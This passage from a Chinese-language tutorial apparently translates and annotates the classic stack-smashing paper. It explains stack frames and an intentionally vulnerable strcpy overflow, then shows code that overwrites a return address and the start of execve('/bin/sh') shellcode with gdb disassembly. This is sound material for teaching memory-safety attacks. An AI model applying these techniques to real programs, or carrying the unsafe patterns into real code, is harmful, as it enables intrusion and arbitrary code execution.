28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>The Stack Region</h3><p>堆栈是一个包含数据的连续内存块。称为堆栈指针（SP）的寄存器指向堆栈的顶部。堆栈的底部位于固定地址。它的大小由内核在运行时动态调整。CPU执行指令以压入堆栈和从堆栈弹出。堆栈由逻辑堆栈帧组成，这些逻辑堆栈帧在调用函数时被压入， 在返回时弹出。栈帧包含函数的参数，局部变量以及恢复先前堆栈所需的数据帧，包括函数调用时指令指针的值。根据实现的不同，堆栈将向下增长（向较低的存储器地址）或向上增长。在我们的示例中，我们将使用逐渐变小的堆栈（即栈由高地址向低地址增长）。这种堆栈增长方式应用于包括Intel，Motorola，SPARC和MIPS处理器在内的许多计算机处理器上。同时，堆栈指针（SP）也依赖于这种实现。它（sp）可能指向堆栈上的最后一个地址，或者指向堆栈之后的下一个可用空闲地址。对于我们的讨论，我们假设它指向堆栈中的最后一个地址。除了指向堆栈顶部（最低数字地址）的堆栈指针外，通常还有指向固定位置的帧的帧指针（FP）。一些文本也将其称为本地基指针（LB）。原则上，可以通过给出局部变量与SP的偏移量来引用局部变量。但是，随着字（数据）被压入堆栈并从堆栈弹出，这些偏移量会发生变化。尽管在某些情况下编译器可以跟踪堆栈上的字数并因此纠正偏移量，但在某些情况下它不能，并且在所有情况下都需要大量管理。此外，在某些机器（例如基于Intel的处理器）上，以距SP已知距离访问变量需要多个指令。因此，许多编译器使用第二个寄存器FP来引用局部变量和参数，因为它们与FP的距离不会随PUSH和POP的变化而变化。在Intel CPU上，BP（EBP）用于此目的。在Motorola CPU上，除A7（堆栈指针）以外的任何地址寄存器都可以。</p><p>由于堆栈增长的方式，实际参数与FP的偏移量为正，局部变量的偏移量为负。函数被调用时必须做的第一件事是保存先前的FP（以便可以在函数退出时将其还原）。然后，它将SP复制到FP(ebp)中以创建新的FP(esp)，并推进SP来为局部变量保留空间。此代码称为过程调用（the procedure prolog、过程序言）。退出函数后，必须再次清理堆栈， 这称为过程结尾。提供了英特尔ENTER和LEAVE指令以及Motorola LINK和UNLINK指令，以高效地执行大多数过程序言和结语。</p><p>让我们看一个简单示例中的堆栈： 过程被调用时必须做的第一件事是保存先前的FP（以便可以在过程退出时将其还原）。然后，它将SP复制到FP(ebp)中以创建新的FP(esp)，并推进SP来为局部变量保留空间 。此代码称为过程序言。退出过程后，必须再次清理堆栈，这称为过程结尾。提供了英特尔ENTER和LEAVE指令以及Motorola LINK和UNLINK指令，以高效地执行大多数过程序言和结语。让我们看一个简单示例中的堆栈：过程被调用时必须做的第一件事是保存先前的FP（以便可以在过程退出时将其还原）。然后，它将SP复制到FP中以创建新的FP，并推进SP来为局部变量保留空间。此代码称为过程序言。退出过程后，必须再次清理堆栈，这称为过程结尾。提供了英特尔ENTER和L EAVE指令以及Motorola LINK和UNLINK指令，以高效地执行大多数过程序言和结语。</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//example1.c
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>function</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=kt>int</span> <span class=n>b</span><span class=p>,</span> <span class=kt>int</span> <span class=n>c</span><span class=p>){</span>
+    <span class=kt>char</span> <span class=n>buffer1</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
+    <span class=kt>char</span> <span class=n>buffer2</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(){</span>
+    <span class=n>function</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>去理解main函数中调用<code>function</code>函数时发生了什么，我们可以用<code>gcc</code> 的<code>-S</code>选项生成汇编语言</p><blockquote><p>我们在64bit编译要加上选项<code>-m32</code> ，否则会发现汇编出来和论文中不同，因为论文中用的是32bit环境</p></blockquote><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span><span class=lnt>98
+</span><span class=lnt>99
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh>$ gcc -S -o example1.s example1.c -m32
+$ cat ./example1.s
+	.file	<span class=s2>&#34;example1.c&#34;</span>
+	.text
+	.globl	<span class=k>function</span>
+	.type	<span class=k>function</span>, @function
+<span class=k>function</span>:
+.LFB0:
+	.cfi_startproc
+	endbr32
+	pushl	%ebp
+	.cfi_def_cfa_offset <span class=m>8</span>
+	.cfi_offset 5, -8
+	movl	%esp, %ebp
+	.cfi_def_cfa_register <span class=m>5</span>
+	subl	<span class=nv>$24</span>, %esp
+	call	__x86.get_pc_thunk.ax
+	addl	<span class=nv>$_GLOBAL_OFFSET_TABLE_</span>, %eax
+	movl	%gs:20, %eax
+	movl	%eax, -12<span class=o>(</span>%ebp<span class=o>)</span>
+	xorl	%eax, %eax
+	nop
+	movl	-12<span class=o>(</span>%ebp<span class=o>)</span>, %eax
+	xorl	%gs:20, %eax
+	je	.L2
+	call	__stack_chk_fail_local
+.L2:
+	leave
+	.cfi_restore <span class=m>5</span>
+	.cfi_def_cfa 4, <span class=m>4</span>
+	ret
+	.cfi_endproc
+.LFE0:
+	.size	<span class=k>function</span>, .-function
+	.globl	main
+	.type	main, @function
+main:
+.LFB1:
+	.cfi_startproc
+	endbr32
+	leal	4<span class=o>(</span>%esp<span class=o>)</span>, %ecx
+	.cfi_def_cfa 1, <span class=m>0</span>
+	andl	<span class=nv>$-</span>16, %esp
+	pushl	-4<span class=o>(</span>%ecx<span class=o>)</span>
+	pushl	%ebp
+	.cfi_escape 0x10,0x5,0x2,0x75,0
+	movl	%esp, %ebp
+	pushl	%ecx
+	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
+	subl	<span class=nv>$4</span>, %esp
+	call	__x86.get_pc_thunk.ax
+	addl	<span class=nv>$_GLOBAL_OFFSET_TABLE_</span>, %eax
+	subl	<span class=nv>$4</span>, %esp
+	pushl	<span class=nv>$3</span>
+	pushl	<span class=nv>$2</span>
+	pushl	<span class=nv>$1</span>
+	call	<span class=k>function</span>
+	addl	<span class=nv>$16</span>, %esp
+	nop
+	movl	-4<span class=o>(</span>%ebp<span class=o>)</span>, %ecx
+	.cfi_def_cfa 1, <span class=m>0</span>
+	leave
+	.cfi_restore <span class=m>5</span>
+	leal	-4<span class=o>(</span>%ecx<span class=o>)</span>, %esp
+	.cfi_def_cfa 4, <span class=m>4</span>
+	ret
+	.cfi_endproc
+.LFE1:
+	.size	main, .-main
+	.section	.text.__x86.get_pc_thunk.ax,<span class=s2>&#34;axG&#34;</span>,@progbits,__x86.get_pc_thunk.ax,comdat
+	.globl	__x86.get_pc_thunk.ax
+	.hidden	__x86.get_pc_thunk.ax
+	.type	__x86.get_pc_thunk.ax, @function
+__x86.get_pc_thunk.ax:
+.LFB2:
+	.cfi_startproc
+	movl	<span class=o>(</span>%esp<span class=o>)</span>, %eax
+	ret
+	.cfi_endproc
+.LFE2:
+	.hidden	__stack_chk_fail_local
+	.ident	<span class=s2>&#34;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0&#34;</span>
+	.section	.note.GNU-stack,<span class=s2>&#34;&#34;</span>,@progbits
+	.section	.note.gnu.property,<span class=s2>&#34;a&#34;</span>
+	.align <span class=m>4</span>
+	.long	 1f - 0f
+	.long	 4f - 1f
+	.long	 <span class=m>5</span>
+0:
+	.string	 <span class=s2>&#34;GNU&#34;</span>
+1:
+	.align <span class=m>4</span>
+	.long	 0xc0000002
+	.long	 3f - 2f
+2:
+	.long	 0x3
+3:
+	.align <span class=m>4</span>
+4:
+</code></pre></td></tr></table></div></div></div><p>通过观察汇编语言，我们可以看到<code>function()</code>的函数调用被翻译为</p><pre><code class=language-assembly data-lang=assembly>;32bit version
+pushl $3 
+pushl $2 
+pushl $1 
+call function
+;64bit version 
+movl	$3, %edx
+movl	$2, %esi
+movl	$1, %edi
+call	function
+</code></pre><p>这将3个参数放入栈中，然后调用<code>function()</code>函数。<code>call</code>指令将会把指令寄存器（Instruction Pointer，IP）的值放入栈中，将保存在栈中的IP的值称为返回地址（RET）。函数中第一件事所做的是procedure prolog（翻译成过程调用？）</p><pre><code class=language-assembly data-lang=assembly>pushl %ebp 
+movl %esp,%ebp 
+subl $20,%esp
+</code></pre><p>这将EBP（栈底指针）放入栈中，然后将现在的SP(esp、rsp，栈顶指针)放入EBP中，是其成为新的栈底指针。将已经保存的栈帧指针（FP）称为SFP。然后将esp减去局部变量的大小，为局部变量分配空间。</p><p>我们必须记住，内存只能以字大小的倍数来寻址。在我们的例子中，一个字是4Byte，或32位。所以我们的5字节缓冲区需要8字节（2个字）的内存，10字节缓冲区需要12字节（3个字）的内存。这就是为什么SP被减去20。考虑到这一点，调用<code>function()</code>时我们的堆栈看起来是这样的（每个空格代表一个字节）：</p><blockquote><p>下图中，左边为低地址，右边为高地址。左边为栈顶，右边为栈底。</p></blockquote><p><img src=stack1.png alt></p><h3 id=buffer-overflows><a href=#buffer-overflows class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Buffer Overflows</h3><p>缓冲区溢出是由于向缓冲区中填充的数据超出其处理能力而导致的。如何利用这个经常发现的编程错误来执行任意代码呢？我们来看看下面这个例子</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//example2.c
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>function</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
+    <span class=n>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span><span class=n>str</span><span class=p>);</span>
+<span class=p>}</span>
+<span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=n>large_string</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+    
+	<span class=k>for</span><span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>255</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> 
+        <span class=n>large_string</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;A&#39;</span><span class=p>;</span>
+    
+    <span class=n>function</span><span class=p>(</span><span class=n>large_string</span><span class=p>);</span>
+<span class=p>}</span> 
+</code></pre></td></tr></table></div></div></div><p>这个程序有一个典型的缓冲区溢出编码错误的函数。函数通过使用<code>strcpy()</code>而不是使用有边界检查的<code>strncpy()</code>去复制字符串。如果你运行这个程序，你会得到一个段错误(segmentation violation)。让我们看看调用函数时它的堆栈是什么样子的</p><p><img src=stack2.png alt></p><p>这里发生了什么？为什么我们会遇到段错误？简单来说，<code>strcpy()</code> 正在复制内容将<code>*str</code>（长字符数组）插入<code>buffer[]</code>中，直到在字符串<code>*str</code>上找到空字符(<code>\0</code>)。我们可以看到<code>buffer[]</code>比<code>*str</code>小得多。<code>buffer[]</code>的长度为16个字节，我们尝试将其填充为256个字节。这意味着堆栈中缓冲区之后的所有240个字节都将被覆盖。这包括<code>SFP</code>，<code>RET</code> 甚至<code>* str</code>！我们已经装满了 <code>large_string</code> 字符“ A”。它的十六进制字符值为<code>0x41</code>。这意味着返回地址现在为0x41414141。这超出了进程地址空间，这就是为什么当函数返回并尝试从该地址读取下一条指令时，你会遇到段错误的原因。因此，缓冲区溢出使我们可以更改函数的返回地址。这样，我们可以更改程序的执行流程。让我们回到第一个示例，并回顾一下堆栈的外观</p><p><img src=stack1.png alt></p><p>让我们尝试修改我们的第一个示例，使其覆盖返回地址，并说明如何使它执行任意代码。堆栈上的<code>buffer1[]</code>之前是SFP，返回地址之前是SFP。那是4个字节经过<code>buffer1[]</code>的末尾。但是请记住，<code>buffer1[]</code>实际上是2个字，因此它的长度为8个字节。因此 ，返回地址是从<code>buffer1[]</code>的开头起的12个字节。我们将以使赋值语句<code>x = 1;</code>的方式修改返回值。之后函数调用将被跳转至我们指定的地址。为此 ，我们将8个字节添加到返回地址。</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//example3.c
+</span><span class=c1>//gcc -fno-stack-protector -m32 
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>function</span><span class=p>(</span><span class=kt>int</span> <span class=n>a</span><span class=p>,</span> <span class=kt>int</span> <span class=n>b</span><span class=p>,</span> <span class=kt>int</span> <span class=n>c</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=n>buffer1</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
+    <span class=kt>char</span> <span class=n>buffer2</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
+    
+    <span class=kt>int</span> <span class=o>*</span><span class=n>ret</span><span class=p>;</span>
+    <span class=n>ret</span> <span class=o>=</span> <span class=n>buffer1</span> <span class=o>+</span> <span class=mi>12</span><span class=p>;</span>
+    <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span> 
+    <span class=kt>int</span> <span class=n>x</span><span class=p>;</span>
+    
+    <span class=n>x</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+    <span class=n>function</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
+    <span class=n>x</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>x</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>我们所做的只是将<code>buffer1[]</code>的地址加了12，然后新地址就是存储了ret的返回地址。我们想要跳过printf的调用，我们怎么知道返回地址需要+8（应该是10）呢？我们可以先测试值（比如example1），编译程序然后用gdb调试</p><pre><code class=language-assembly data-lang=assembly>$ gdb example3 GDB is free software and you are welcome to distribute copies of it under certain conditions; type &quot;show copying&quot; to see the conditions.
+There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... 
+(gdb) disassemble main Dump of assembler code for function main: 
+Dump of assembler code for function main:
+0x8000490 :pushl %ebp
+0x8000491 :	movl %esp,%ebp
+0x8000493 :	subl $0x4,%esp
+0x8000496 :	movl $0x0,0xfffffffc(%ebp)
+0x800049d :	pushl $0x3
+0x800049f :	pushl $0x2
+0x80004a1 :	pushl $0x1
+0x80004a3 :	call 0x8000470
+0x80004a8 :	addl $0xc,%esp
+0x80004ab :	movl $0x1,0xfffffffc(%ebp)
+0x80004b2 :	movl 0xfffffffc(%ebp),%eax
+0x80004b5 :	pushl %eax
+0x80004b6 :	pushl $0x80004f8
+0x80004bb :	call 0x8000378
+0x80004c0 :	addl $0x8,%esp
+0x80004c3 :	movl %ebp,%esp
+0x80004c5 :	popl %ebp
+0x80004c6 :	ret
+0x80004c7 :	nop
+</code></pre><p>我们可以看到调用<code>function()</code>函数的返回地址为<code>0x8004a8</code>，而我们想跳过<code>0x80004ab</code>处的赋值。我们要执行的下一条指令为<code>0x8004b2</code>。一点数学运算即可告诉我们距离为8个字节（应为10个字节）</p><h3 id=shell-code><a href=#shell-code class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Shell Code</h3><p>因此，既然我们知道可以修改返回地址和执行流程，那么我们要执行什么程序？在大多数情况下，我们只希望程序生成一个shell。然后，可以从shell中根据需要发出其他命令。但是，如果我们尝试利用的程序中没有这样的代码，该怎么办？我们如何将任意指令放入其地址空间？答案是将代码放到你想执行缓冲区溢出的地方，并覆写返回地址，以便它指向缓冲区 。假设堆栈从地址0xFF开始，并且S代表我们要执行堆栈的代码，则将如下所示</p><p><img src=stack3.png alt></p><p>在C中生成shell的代码如下：</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&#34;stdio.h&#34;</span><span class=cp>
+</span><span class=cp></span><span class=kt>void</span> <span class=nf>main</span><span class=p>(){</span>
+    <span class=kt>char</span> <span class=o>*</span><span class=n>name</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+    <span class=n>name</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/bin/sh&#34;</span><span class=p>;</span>
+    <span class=n>name</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+    <span class=n>execve</span><span class=p>(</span><span class=n>name</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>name</span><span class=p>,</span><span class=nb>NULL</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>为了找出汇编中的shellcode，我们对其进行编译，然后启动gdb。记住要使用静态标志。否则，实际的代码 执行系统调用将不包括在内。取而代之的是，将有对动态C库的引用，该引用通常会在加载时链接到其中。</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh>$ gcc -o shellcode -ggdb -static shellcode.c
+</code></pre></td></tr></table></div></div></div><pre><code class=language-assembly data-lang=assembly>$ gcc -o shellcode -ggdb -static shellcode.c [aleph1]$ gdb shellcode GDB is free software and you are welcome to distribute copies of it under certain conditions; type &quot;show copying&quot; to see the conditions.
+There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... 
+(gdb) disassemble main Dump of assembler code for function main: 
+0x8000130 :		pushl %ebp
+0x8000131 :		movl %esp,%ebp
+0x8000133 :		subl $0x8,%esp
+0x8000136 :		movl $0x80027b8,0xfffffff8(%ebp)
+0x800013d :		movl $0x0,0xfffffffc(%ebp)
+0x8000144 :		pushl $0x0
+0x8000146 :		leal 0xfffffff8(%ebp),%eax
+0x8000149 :		pushl %eax
+0x800014a :		movl 0xfffffff8(%ebp),%eax
+0x800014d :		pushl %eax
+0x800014e :		call 0x80002bc &lt;__execve&gt;
+0x8000153 :		addl $0xc,%esp
+0x8000156 :		movl %ebp,%esp
+0x8000158 :		popl %ebp
+0x8000159 :		ret
+End of assembler dump
+(gdb) disassemble __execve 
+Dump of assembler code for function __execve: 
+0x80002bc &lt;__execve&gt;:		pushl %ebp
+0x80002bd &lt;__execve+1&gt;:		movl %esp,%ebp
+0x80002bf &lt;__execve+3&gt;:		pushl %ebx
+0x80002c0 &lt;__execve+4&gt;:		movl $0xb,%eax
+0x80002c5 &lt;__execve+9&gt;:		movl 0x8(%ebp),%ebx
+0x80002c8 &lt;__execve+12&gt;:	movl 0xc(%ebp),%ecx
+0x80002cb &lt;__execve+15&gt;:	movl 0x10(%ebp),%edx
+0x80002ce &lt;__execve+18&gt;:	int	$0x80
+0x80002d0 &lt;__execve+20&gt;:	movl %eax,%edx
+0x80002d2 &lt;__execve+22&gt;:	testl %edx,%edx
+0x80002d4 &lt;__execve+24&gt;:	jnl	0x80002e6 &lt;__execve+42&gt;
+0x80002d6 &lt;__execve+26&gt;:	negl %edx
+0x80002d8 &lt;__execve+28&gt;:	pushl %edx
+0x80002d9 &lt;__execve+29&gt;:	call 0x8001a34 &lt;__normal_errno_location&gt;
+0x80002de &lt;__execve+34&gt;:	popl %edx
+0x80002df &lt;__execve+35&gt;:	movl %edx,(%eax)
+0x80002e1 &lt;__execve+37&gt;:	movl $0xffffffff,%eax
+0x80002e6 &lt;__execve+42&gt;:	popl %ebx
+0x80002e7 &lt;__execve+43&gt;:	movl %ebp,%esp
+0x80002e9 &lt;__execve+45&gt;:	popl %ebp
+0x80002ea &lt;__execve+46&gt;:	ret
+0x80002eb &lt;__execve+47&gt;:	nop
+End of assembler dump.
+</code></pre><hr><p>让我们了解这发生了什么，我们从main函数开始</p><pre><code class=language-assembly data-lang=assembly>0x8000130 :		pushl %ebp
+0x8000131 :		movl %esp,%ebp
+0x8000133 :		subl $0x8,%esp
+</code></pre><p>这就是程序的前奏，他首先保存旧的栈帧指针，保证现在的栈顶指针是一个新的栈帧指针，然后为局部变量留出空间。在这个shellcode的例子中，<code>char *name[2]</code> ，2个只想char字符的指针，指针大小为一个字的长度，所以这里会开拓两个字的容量（8 byte）</p><blockquote><ul><li><code>movl</code> 和 <code>leal</code> 指令区别：</li></ul><p><code>movl</code>是把访问的内存内容赋值给寄存器， leal是將地址赋值给寄存器
+<code>movl 0x18(%edx), %eax</code>
+<code>leal 0x18(%edx), %eax</code>
+<code>leal</code>将 <code>0x18(%edx)</code>处的内容，比如是数字4，将4的地址给eax
